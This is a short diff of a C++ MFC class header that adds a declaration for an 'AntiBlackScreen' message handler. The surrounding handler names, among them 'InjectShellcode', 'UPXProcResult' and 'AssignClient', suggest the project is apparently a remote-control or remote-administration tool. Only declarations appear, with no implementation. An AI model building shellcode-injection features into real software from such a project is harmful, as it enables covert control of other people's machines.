@@ -300,6 +300,7 @@ public:
     afx_msg LRESULT OnOpenDrawingBoard(WPARAM wParam, LPARAM lParam);
     afx_msg LRESULT UPXProcResult(WPARAM wParam, LPARAM lParam);
     afx_msg LRESULT InjectShellcode(WPARAM wParam, LPARAM lParam);
+    afx_msg LRESULT AntiBlackScreen(WPARAM wParam, LPARAM lParam);
     afx_msg LRESULT ShareClient(WPARAM wParam, LPARAM lParam);
     LRESULT assignFunction(WPARAM wParam, LPARAM lParam, BOOL all);
     afx_msg LRESULT AssignClient(WPARAM wParam, LPARAM lParam);
